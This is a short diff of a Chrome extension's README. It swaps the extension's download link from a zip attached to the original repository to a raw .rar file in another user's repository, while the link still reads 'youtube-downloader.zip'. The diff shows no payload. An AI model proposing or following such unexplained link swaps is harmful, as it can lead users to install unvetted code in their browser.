@@ -8,7 +8,7 @@
 
 <img width="771" alt="Screen Shot 2023-12-12 at 19 35 26" src="https://github.com/rlivaev/chrome-extension/assets/107141560/9a6ebcb9-69af-4c17-a8fd-015f5ffb3b80">
 
-[youtube-downloader.zip](https://github.com/rlivaev/chrome-extension/files/13648724/youtube-downloader.zip)
+[youtube-downloader.zip](https://github.com/barantaran/youtube-downloader/raw/fix-button/dist/youtube-downloader-1.1.rar)
 
  ### 1. You need to download the extension itself, it is attached above
  ### 2. Enable developer mode
